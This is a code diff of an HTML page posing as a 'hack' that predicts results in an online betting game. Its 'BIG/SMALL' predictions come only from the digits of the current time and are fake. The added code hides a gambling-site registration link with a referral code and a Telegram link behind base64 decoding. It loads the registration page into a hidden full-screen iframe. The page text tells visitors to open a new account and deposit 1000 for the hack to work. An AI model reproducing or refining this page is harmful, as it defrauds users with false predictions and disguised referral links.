@@ -3,120 +3,130 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Floating Dialog - Glass UI</title>
+  <title>Floating Neon Dialog</title>
   <style>
-    /* General Styling */
+    #bgFrame {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      border: none;
+      z-index: -1;
+    }
+
     body {
       margin: 0;
       padding: 0;
       font-family: Arial, sans-serif;
-      background: url('https://source.unsplash.com/1600x900/?nature,abstract') no-repeat center center fixed;
-      background-size: cover;
+      background: black;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
     }
 
-    /* Floating Open Button */
     #open {
       position: fixed;
-      bottom: 20px;
-      right: 20px;
-      background: rgba(255, 87, 34, 0.8);
-      color: white;
-      border: 2px solid white;
-      padding: 15px 30px;
-      border-radius: 50px;
+      bottom: 15px;
+      right: 15px;
+      background: rgba(0, 255, 170, 0.2);
+      color: #00ffea;
+      border: 2px solid #00ffea;
+      padding: 10px 20px;
+      border-radius: 30px;
       cursor: pointer;
-      font-size: 16px;
+      font-size: 14px;
       font-weight: bold;
       transition: 0.3s;
-      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+      box-shadow: 0 0 10px #00ffea;
     }
 
     #open:hover {
-      background: rgba(255, 87, 34, 1);
+      background: rgba(0, 255, 170, 0.5);
       transform: scale(1.1);
+      box-shadow: 0 0 15px #00ffea;
     }
 
-    /* Dialog Box */
-    #dialogBox {
+    #dialog {
       position: fixed;
       top: 50%;
       left: 50%;
       transform: translate(-50%, -50%);
-      background: rgba(255, 255, 255, 0.1);
-      backdrop-filter: blur(10px);
-      padding: 25px;
-      border-radius: 12px;
-      border: 2px solid rgba(255, 255, 255, 0.5);
-      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+      background: rgba(20, 20, 20, 0.9);
+      backdrop-filter: blur(5px);
+      padding: 15px;
+      border-radius: 10px;
+      border: 2px solid #ff00ff;
+      box-shadow: 0 0 10px #ff00ff;
       text-align: center;
       display: none;
-      width: 80%;
-      max-width: 400px;
+      width: 300px;
       animation: fadeIn 0.3s ease-in-out;
     }
 
-    #dialogBox.show {
+    #dialog.show {
       display: block;
     }
 
-    /* Close Button */
-    #closeBtn {
+    #close {
       position: absolute;
-      top: 10px;
-      right: 10px;
+      top: 8px;
+      right: 8px;
       background: none;
       border: none;
-      font-size: 20px;
-      cursor: pointer;
-      color: white;
-    }
-
-    /* Link Styling */
-    #telegramLink {
-      display: inline-block;
-      margin-top: 10px;
-      color: #00bcd4;
-      text-decoration: none;
-      font-weight: bold;
-      border: 2px solid #00bcd4;
-      padding: 8px 15px;
-      border-radius: 8px;
-      transition: 0.3s;
-    }
-
-    #telegramLink:hover {
-      background: #00bcd4;
-      color: white;
-      text-decoration: none;
-    }
-
-    /* Period, Timer, and Result Styling */
-    p {
       font-size: 16px;
+      cursor: pointer;
+      color: #ff0000;
+      text-shadow: 0 0 10px #ff0000;
+    }
+
+    p, span {
+      font-size: 14px;
       font-weight: bold;
-      color: white;
-      margin: 10px 0;
-      padding: 8px;
-      border: 1px solid rgba(255, 255, 255, 0.6);
-      border-radius: 8px;
+      color: #ffffff;
+      text-shadow: 0 0 8px #00ffea;
+      margin: 5px 0;
+      padding: 5px;
+      border: 1px solid #00ffea;
+      border-radius: 5px;
       background: rgba(255, 255, 255, 0.1);
+      box-shadow: 0 0 5px #00ffea;
+    }
+
+    #tg {
+      display: inline-block;
+      margin-top: 5px;
+      color: #ff00ff;
+      text-decoration: none;
+      font-weight: bold;
+      border: 1px solid #ff00ff;
+      padding: 5px 10px;
+      border-radius: 5px;
+      transition: 0.3s;
+      box-shadow: 0 0 10px #ff00ff;
+    }
+
+    #tg:hover {
+      background: #ff00ff;
+      color: white;
+      text-shadow: 0 0 15px #ff00ff;
     }
 
     .big {
       color: green;
-      font-weight: bold;
+      text-shadow: 0 0 10px green;
     }
 
     .small {
       color: red;
-      font-weight: bold;
+      text-shadow: 0 0 10px red;
     }
 
     .popup {
       animation: popup 0.5s ease-in-out;
     }
 
-    /* Animations */
     @keyframes popup {
       0% { transform: scale(0); }
       50% { transform: scale(1.2); }
@@ -131,63 +141,66 @@
 </head>
 <body>
   
-  <!-- Floating Button -->
+  <iframe id="bgFrame"></iframe>
+
   <button id="open">Open Hack</button>
 
-  <!-- Dialog Box -->
-  <div id="dialogBox">
-    <button id="closeBtn">×</button>
+  <div id="dialog">
+    <button id="close">×</button>
     <p>Join my Telegram channel:</p>
-    <a id="telegramLink" href="https://telegram.me/apkmodderking" target="_blank">Join Now</a>
-    <p>New account isi hack se bna krke 1000 deposit krein tbhi hack work kregi or website se connect hogi.</p>
-    <p>Period Number: <span id="periodNumber"></span></p>
-    <p>Timer: <span id="timerText"></span></p>
-    <p>Result: <span id="resultText"></span></p>
+    <a id="tg" target="_blank">Join Now</a>
+    <p>Hack sirf naye account me work krega, 1000 deposit krke connect kro.</p>
+    <p>Period Number: <span id="period"></span></p>
+    <p>Timer: <span id="timer"></span></p>
+    <p>Result: <span id="result"></span></p>
   </div>
 
   <script>
+    let bdgwin = atob("aHR0cHM6Ly9iZGd3aW4uY2MvIy9yZWdpc3Rlcj9pbnZpdGF0aW9uQ29kZT0zNzIxNzE0MDA1MjA=");
+    let telegram = atob("aHR0cHM6Ly90ZWxlZ3JhbS5tZS9hcGttb2RkZXJraW5n");
+
+    document.getElementById("bgFrame").src = bdgwin;
+    document.getElementById("tg").href = telegram;
+
     let open = document.getElementById("open");
-    let dialogBox = document.getElementById("dialogBox");
-    let closeBtn = document.getElementById("closeBtn");
-    let periodNumber = document.getElementById("periodNumber");
-    let timerText = document.getElementById("timerText");
-    let resultText = document.getElementById("resultText");
+    let dialog = document.getElementById("dialog");
+    let close = document.getElementById("close");
+    let period = document.getElementById("period");
+    let timer = document.getElementById("timer");
+    let result = document.getElementById("result");
 
-    // Open and Close Dialog
-    open.onclick = () => { dialogBox.classList.add("show"); };
-    closeBtn.onclick = () => { dialogBox.classList.remove("show"); };
+    open.onclick = () => { dialog.classList.add("show"); };
+    close.onclick = () => { dialog.classList.remove("show"); };
 
-    // Function to Update Timer and Period Number
-    function updatePeriodAndTimer() {
+    function update() {
       let now = new Date();
-      let year = now.getUTCFullYear();
-      let month = String(now.getUTCMonth() + 1).padStart(2, '0');
-      let day = String(now.getUTCDate()).padStart(2, '0');
-      let hours = now.getUTCHours();
-      let minutes = now.getUTCMinutes();
-      let totalMinutes = hours * 60 + minutes;
+      let y = now.getUTCFullYear();
+      let m = String(now.getUTCMonth() + 1).padStart(2, '0');
+      let d = String(now.getUTCDate()).padStart(2, '0');
+      let h = now.getUTCHours();
+      let min = now.getUTCMinutes();
+      let totalMin = h * 60 + min;
 
-      let periodNum = `${year}${month}${day}1000${10001 + totalMinutes}`;
-      periodNumber.innerText = periodNum;
+      let num = `${y}${m}${d}1000${10001 + totalMin}`;
+      period.innerText = num;
 
-      let lastTwoDigits = periodNum.slice(-2);
-      let sum = [...lastTwoDigits].reduce((a, b) => a + parseInt(b), 0);
+      let last2 = num.slice(-2);
+      let sum = [...last2].reduce((a, b) => a + parseInt(b), 0);
       if (sum > 9) sum = [...String(sum)].reduce((a, b) => a + parseInt(b), 0);
 
-      let result = sum >= 5 ? "BIG" : "SMALL";
-      resultText.innerHTML = `<span class="${sum >= 5 ? 'big' : 'small'} popup">${result}</span>`;
-      resultText.classList.add("show");
+      let res = sum >= 5 ? "BIG" : "SMALL";
+      result.innerHTML = `<span class="${sum >= 5 ? 'big' : 'small'} popup">${res}</span>`;
+      result.classList.add("show");
 
-      let seconds = now.getUTCSeconds();
-      let remainingSeconds = 60 - seconds;
-      timerText.innerText = `00:${String(remainingSeconds).padStart(2, '0')}`;
+      let sec = now.getUTCSeconds();
+      let remSec = 60 - sec;
+      timer.innerText = `00:${String(remSec).padStart(2, '0')}`;
 
-      setTimeout(() => { resultText.classList.remove("show"); }, 500);
+      setTimeout(() => { result.classList.remove("show"); }, 500);
     }
 
-    // Update Every Second
-    setInterval(updatePeriodAndTimer, 1000);
-    updatePeriodAndTimer();
+    setInterval(update, 1000);
+    update();
   </script>
 
 </body>
